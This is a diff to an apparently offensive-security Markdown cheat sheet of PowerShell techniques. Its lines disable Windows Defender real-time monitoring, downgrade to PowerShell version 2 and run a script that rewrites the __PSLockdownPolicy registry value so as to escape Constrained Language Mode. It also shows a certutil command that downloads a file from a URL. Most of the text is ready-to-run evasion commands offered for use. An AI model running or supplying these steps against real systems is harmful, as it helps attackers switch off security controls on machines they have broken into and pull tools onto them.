@@ -5,12 +5,37 @@
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
+## Constrained Lanuage Mode
 #### Check the language mode
 ```
 $ExecutionContext.SessionState.LanguageMode
 ```
 
-#### Download with certutil
+### Escapes for Constrained Language Mode
+#### Launch Powershell Version 2
+```
+Powershell.exe -Version 2
+```
+
+#### Overwrite __PSLockdownPolicy variable
+- If CLM is not implemented correctly.
+- https://github.com/Metoraf007/Public_PowerShell/blob/master/Bypass_ConstrainedLang.ps1
+```
+#Requires -RunAsAdministrator
+
+If ( $ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage") {
+    Set-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy" -Value 8
+
+    Start-Process -File PowerShell.exe -Argument "-file $($myinvocation.mycommand.definition)"
+    Break
+}
+
+Write-Host $ExecutionContext.SessionState.LanguageMode
+
+Start-Sleep -s 10
+```
+
+#### Download files with certutil
 ```
 certutil -urlcache -split -f <URL>
 ```
